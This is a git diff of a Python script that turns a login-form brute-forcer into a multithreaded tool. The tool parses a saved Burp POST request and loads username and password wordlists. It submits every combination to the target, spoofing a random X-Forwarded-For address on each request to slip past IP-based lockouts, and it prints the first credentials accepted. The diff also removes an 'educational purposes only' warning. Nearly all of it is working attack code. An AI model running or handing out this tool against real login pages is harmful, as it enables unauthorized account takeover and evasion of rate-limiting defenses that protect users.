@@ -4,10 +4,94 @@ import sys
 import requests
 import random
 import time
+import threading
+import queue
+import os
 
-# WARNING!!!!!! THIS IS ONLY FOR EDUCATIONAL PURPOSES AND FOR PENTESTERS! DO NOT USE IT ILLEGALY!
+class App():
 
-print("""
+    def __init__(self):
+        try:
+            self.path_to_request_file = sys.argv[1].strip()
+            self.path_to_user_list = sys.argv[2].strip()
+            self.path_to_password_list = sys.argv[3].strip()
+            self.amount_of_threads = int(sys.argv[4].strip())
+        except IndexError:
+            print("\nYou have to call the program like that: \n")
+            print("\t\033[1m" + "python3 *program* *request* *user_list* *password_list* *amount_of_threads*\n")
+            print("\033[0m" + "Recommondation: 10 Threads\nThe rest will be interactive.")
+            exit()
+
+    def open_file(self, file_path):
+        try:
+            file = open(file_path, "r")
+            return file
+        except FileNotFoundError:
+            print("\nThe request file was not found, exiting...")
+            exit()
+
+    def read_wordlist(self, file):
+            #Read every line and strip them afterwards
+            lines_not_stripped = file.readlines()
+            lines_stripped = [row.strip() for row in lines_not_stripped]
+            return lines_stripped
+
+    def read_and_format_request(self, req):
+        #Read the request with new lines
+        request = repr(req.read())
+        if request == "":
+            print("The request file is empty, exiting...")
+            exit()
+        #Remove the ' at the beginning and end
+        request = request[1:len(request)-1]
+        return request
+
+    def get_row_content(self, row):
+        return self.content_request_file[row - 1]
+
+    def open_read_and_save_file_content(self):
+        #Open files
+        self.request_file = self.open_file(self.path_to_request_file)
+        self.user_list = self.open_file(self.path_to_user_list)
+        self.password_list = self.open_file(self.path_to_password_list)
+
+        #Read user and password lists
+        self.content_user_list = self.read_wordlist(self.user_list)
+        self.content_password_list = self.read_wordlist(self.password_list)
+
+        #Read the request file not stripped
+        self.content_request_not_per_line = self.read_and_format_request(self.request_file)
+        self.content_request_file = [row for row in self.content_request_not_per_line.split('\\n')]
+    
+    def checking_for_invalid_http_method(self):
+        if not self.content_request_file[0].startswith("POST"):
+            print("The request method must be POST")
+            exit()
+
+    def headers_end_at(self):
+        row = 0
+        for x in self.content_request_file:
+            if x == "":
+                return row
+            row+=1
+
+    def pull_headers_into_dict(self):
+        self.headers = {}
+        for x in range(1, self.headers_end_at()):
+            self.headers[self.content_request_file[x].split(":", 1)[0]] = self.content_request_file[x].split(":", 1)[1].split(" ", 1)[1]
+
+    def pull_and_format_data_to_be_sent(self):
+        try:
+            self.keyandvalue = {}  ####WARNING, I NEED TO CHECK THIS PART
+            for row in range(self.headers_end_at()+1, len(self.content_request_file)-1):
+                for x in range(self.content_request_file[row].count("&")+1):
+                    self.keyandvalue[self.content_request_file[row].split("&")[x].split("=")[0]] = self.content_request_file[row].split("&")[x].split("=")[1]
+        except IndexError:
+            print("You probably have some empty lines at the bottom of your request.\n")
+            print("Make sure to use the \"save request\" option inside burp")
+
+    def ask_user_for_more_data(self):
+        print("""
 
 Created by 44h
 ___________________________________________________________________________
@@ -29,263 +113,174 @@ ___________________________________________________________________________
 ___________________________________________________________________________
 
 
-	""")
+    """)
 
 
-#---------------------------------------------------------------------
+        ###########################
+        #Ask for username argument#
+        ###########################
+        print("\nChoose the argument for the username OR email BY NUMBER:\n")
+        tempListUser = []
+        for x in self.keyandvalue:
+            tempListUser.append(x)
+        i = 1
+        #print(tempListUser)
 
-try:
-	request_file = sys.argv[1].strip()
-	path_to_wordlist = sys.argv[2].strip()
-except IndexError:
-	print("\nYou have to call the program like that: \n")
-	print("\t\033[1m" + "python3 program.py requestfile wordlist\n")
-	print("\033[0m" + "The rest will be interactive.")
-	exit()
+        for x in tempListUser:
+            print(f"[{i}] {x}")
+            i = i + 1
+        try:
+            user_input = int(input("> "))
+        except ValueError:
+            print("\nERROR: Enter a number next time")
+            exit()
+        
+        if user_input>len(self.keyandvalue) or user_input == "" or user_input < 1:
+            print("1. Couldn't find that argument\n2. You chose the same argument both times, exiting...")
+            exit()
+        try:
+            self.username_argument = tempListUser[user_input-1]
+        except IndexError:
+            print(tempListUser)
 
+        ###########################
+        #Ask for password argument#
+        ###########################
 
-#Open the request file
-try: 
-	request_file = open(request_file, "r")
-except FileNotFoundError:
-	print("\n The request file was not found, exiting...")
-	exit()
+        print("\n=================================================================\n")
+        print("Choose the argument for the password BY NUMBER:\n")
+        
+        ii = 1
+        for x in tempListUser:
+            print(f"[{ii}] {x}")
+            ii = ii + 1
+        try:
+            password_input = int(input("> "))
+        except ValueError:
+            print("ERROR: Enter a number next time")
+            exit()
+        if password_input>len(self.keyandvalue) or password_input == "" or password_input < 1 or password_input == user_input:
+            print("1. Couldn't find that argument\n2. You chose the same argument both times, exiting...")
+            exit()
+        self.password_argument = tempListUser[password_input-1]
 
-#Open the wordlist file
-try: 
-	wordlist_file = open(path_to_wordlist, "r")
-except FileNotFoundError:
-	print("\n The wordlist file was not found, exiting...")
-	exit()
+        ###########################
+        ### Invalid Credentials ###
+        ###########################
 
+        print("\n=================================================================\n")
+        print("Now enter a text that you ONLY get when you enter invalid credentials:\n")
+        self.invalid_credentials_output = input("> ")
 
-#Read the request file with new line characters
-request_file_content = repr(request_file.read())
+        ###########################
+        ###### SSL Encryption #####
+        ###########################
 
-if request_file_content == "":
-	print("The request file is empty, exiting...\n")
-	exit()
+        self.ssl_encryption = None
+        print("\n=================================================================\n")
+        print("Does it use SSL encryption?\n")
+        print("[1] yes\n[2] no")
+        temp3 = int(input("> "))
+        if temp3 == 1:
+            self.ssl_encryption = True
+        elif temp3 == 2:
+            self.ssl_encryption = False
+        else:
+            print("That was not an option, exiting...")
+            exit()
+        print("\n=================================================================\n")
 
-#Read the wordlist file without new line characters
-wordlist_file_content_per_file_not_stripped = wordlist_file.readlines()
-wordlist_file_content_per_file = [row.strip() for row in wordlist_file_content_per_file_not_stripped]
+    def concatenate_url(self):
+        partone = self.headers["Host"]
+        temp = self.content_request_file[0][5::]
+        parttwo = temp.split(' ')[0]
+        self.url = partone + parttwo
+        if self.ssl_encryption == True:
+            self.url = "https://" + self.url
+        else:
+            self.url = "http://" + self.url
+        if self.url == "":
+            print("You don't have a HOST header set. Please set it and retry.")
+            exit()
 
-#Format the content
-request_file_content = request_file_content[1:len(request_file_content)-1]
+    def create_queue(self):
+        self.username_queue = queue.Queue()
+        self.password_queue = queue.Queue()
 
-#Get amount of rows of the request file 
-amount_of_rows_in_request_file = request_file_content.count('\\n') +1
+        amount_of_rows_pass_file = len(self.content_password_list)
+        amount_of_rows_pass_user = len(self.content_user_list)
 
-#Create a list with all rows
-row_content_request_file = [row for row in request_file_content.split('\\n')]
+        print("##################################################")
+        print(f"Loading username and password file {(amount_of_rows_pass_file+amount_of_rows_pass_user)} lines")
+        print("##################################################\n")
 
-def getRowContent(row):
-	return row_content_request_file[row-1]
+        for username in self.content_user_list:
+            for password in self.content_password_list:
+                self.username_queue.put(username)
 
-#Checking for POST method:
-if not getRowContent(1).startswith("POST"):
-	print("The request method must be POST")
-	exit()
+        for username in self.content_user_list:
+            for password in self.content_password_list:
+                self.password_queue.put(password)
 
-if (row_content_request_file[len(row_content_request_file)-1]) == "":
-	del row_content_request_file[len(row_content_request_file)-1]
+        self.queue_list2 = list(self.password_queue.queue)
+        #print(f"\n{self.queue_list2}\n")
 
-#---------------------------------------------------------------------
-
-#Get headers and put into a set
-def headersEndAt():
-	row = 0
-	for x in row_content_request_file:
-		if x == "":
-			return row
-		row+=1
-
-headers = set()
-
-headersAreOverInLine = headersEndAt()
-
-for x in range(1, headersAreOverInLine):
-	headers.add(row_content_request_file[x])
-
-#print(headers)
-#---------------------------------------------------------------------
-
-#Get parameters and choose two, one password and one username
-
-arguments = []
-
-keyandvalue = []
-
-amount_of_arguments = row_content_request_file[len(row_content_request_file)-1].count('=')
-
-password_argument = ""
-
-username_or_email_argument = ""
-
-ssl_encryption = False
-
-def getArguments():
-	global keyandvalue
-	global arguments
-	keyandvalue = row_content_request_file[len(row_content_request_file)-1].split('&')
-	for x in keyandvalue:
-		arguments.append(x.split('=')[0])
-	
-getArguments()
-
-def outputPossibleUsernamesAndPasswords():
-	global arguments
-	global username_or_email_argument
-	global password_argument
-	print("\n")
-	print("Choose the argument for the username OR email BY NUMBER:\n")
-	iteratorUsername = 1
-	for x in arguments:
-		print(f"[{iteratorUsername}] \"{x}\"\n")
-		iteratorUsername+=1
-	try:
-		uinput = int(input("> "))
-	except ValueError:
-		print("ERROR: Enter a number next time")
-		exit()
-	if uinput>len(arguments) or uinput == "":
-		print("Couldn't find that argument, exiting...")
-		exit()
-		#EDIT, WHEN STRING IS ENTERED, LEAVE
-	username_or_email_argument = arguments[uinput-1]
-	print("\n")
-	print("=================================================================\n")
-	print("Choose the argument for the password BY NUMBER:\n")
-	iteratorPassword = 1
-	for x in arguments:
-		print(f"[{iteratorPassword}] \"{x}\"\n")
-		iteratorPassword+=1
-	try:
-		pinput = int(input("> "))
-	except ValueError:
-		print("ERROR: Enter a number next time")
-		exit()
-	if uinput == pinput or uinput == "":
-		print("WARNING: YOU SELECTED THE SAME FIELD TWICE!\n")
-		print(f"So you selected the field {username_or_email_argument} for username and password, which makes no sense\n")
-		exit()
-	elif pinput > len(arguments):
-		print("Couldn't find the argument, exiting...")
-		exit()
-
-	password_argument = arguments[pinput-1]
-	print("\n")
-	#print(f"Selected: {username_or_email_argument} as a username/email field and {password_argument} as a password field")
-
-outputPossibleUsernamesAndPasswords()
+        self.queue_list = list(self.username_queue.queue)
+        #print(f"\n{self.queue_list}\n")
 
 
-print("\n")
-print("=================================================================\n")
-print("Which username do you want to authenticate as when bruteforcing through the password list:\n")
-username = input("> ")
+    def brute_force(self):
+        for i in range(len(self.queue_list)+1):
+            data = {}
+            for x in self.keyandvalue:
+                if x.split('=')[0] == self.username_argument:
+                    data[self.username_argument] = self.username_queue.get().strip()
+                elif x.split('=')[0] == self.password_argument:
+                    data[self.password_argument] = self.password_queue.get().strip()
+                else:
+                    data[x.split('=')[0]] = x.split('=')[1]
+            ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+            self.headers['X-Forwarded-For'] = ip
+            response = requests.post(self.url, headers=self.headers, data=data)
+            time.sleep(1)
+            if str(self.invalid_credentials_output) in str(response.content):
+                print(f"[-] Username: \"{data[self.username_argument]}\" & Password:\"{data[self.password_argument]}\"")
+            else:
+                print("\n\n(One) Password Found:\n")
+                print(f"[+] Username: \"{data[self.username_argument]}\" & Password:\"{data[self.password_argument]}\"\n")
+                os._exit(0)
 
-print("\n\n")
-print("=================================================================\n")
-print("Now enter a text that you get when you enter invalid credentials:\n")
-invalid_credentials_output = input("> ")
-print("\n")
+    def create_threads(self):
+        self.threads = []
+        for x in range(self.amount_of_threads):
+            thread = threading.Thread(target=self.brute_force)
+            self.threads.append(thread)
 
-print("=================================================================\n")
-print("Does it use SSL encryption?\n")
-print("[1] yes\n[2] no")
-temp3 = int(input("> "))
-if temp3 == 1:
-	ssl_encryption = True
-elif temp3 == 2:
-	ssl_encryption = False
-else:
-	print("That was not an option, exiting...")
-	exit()
+        for thread in self.threads:
+            thread.start()
+            time.sleep(0.1)
 
+    def close_file(self, file):
+        file.close()
+        
+    def close_files(self):
+        self.close_file(self.request_file)
+        self.close_file(self.user_list)
+        self.close_file(self.password_list)
 
-#Formating headers, data and all the other stuff that is need
-
-headers_dict = {}
-url = ""
-
-def convertHeaderSetIntoDict():
-	global headers_dict
-	for x in headers:
-		headers_dict[x.split(":", 1)[0]] = x.split(": ", 1)[1]
-
-
-
-convertHeaderSetIntoDict()
-
-
-def concatenate_url():
-	global headers_dict
-	global ssl_encryption
-	global url
-	partone = headers_dict["Host"]
-	temp = row_content_request_file[0][5::]
-	parttwo = temp.split(' ')[0]
-	url = partone + parttwo
-	if ssl_encryption == True:
-		url = "https://" + url
-	else:
-		url = "http://" + url
-
-concatenate_url()
-
-if url == "":
-	print("URL was \"\"")
-	exit()
-
-print("\n")
-print("\n")
-print("Stating to brute force")
-
-#BRUTE FORCING:
-
-for password in wordlist_file_content_per_file:
-
-	headers_dict2 = headers_dict
-	
-	#print(headers_dict2)
-	#print("\n\n")
-	#forging the data that is sent to the server
-	data = {}
-	temp = keyandvalue
-	for x in keyandvalue:
-		if x.split('=')[0] == username_or_email_argument:
-			data[username_or_email_argument] = username
-		elif x.split('=')[0] == password_argument:
-			data[password_argument] = password
-		else:
-			data[x.split('=')[0]] = x.split('=')[1]
-	#print("\n")
-	#print(f"Url {url}")
-	#print(f"Headers {headers_dict2}")
-	#print(f"Data {data}")
-	ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
-	#print(ip)
-	headers_dict2['X-Forwarded-For'] = ip
-	#print(headers_dict2)
-	response = requests.post(url, headers=headers_dict2, data=data)
-	#print(response.content)
-	#print(str(invalid_credentials_output))
-	#print(str(response.content))
-
-	if str(invalid_credentials_output) in str(response.content):
-		print(f"[-] {password}")
-
-	else:
-		print("\n")
-		print("\n")
-		print("(One) Password Found:\n")
-		print(f"[+] {password}\n")
-		exit()
+    def start(self):
+        self.open_read_and_save_file_content()
+        self.checking_for_invalid_http_method()
+        self.pull_headers_into_dict()
+        self.pull_and_format_data_to_be_sent()
+        self.ask_user_for_more_data()
+        self.concatenate_url()
+        self.close_files()
+        self.create_queue()
+        self.create_threads()
 
 
-request_file.close()
-wordlist_file.close()
+if __name__ == "__main__":
+    app = App()
+    app.start()
 
-
-#print(data)
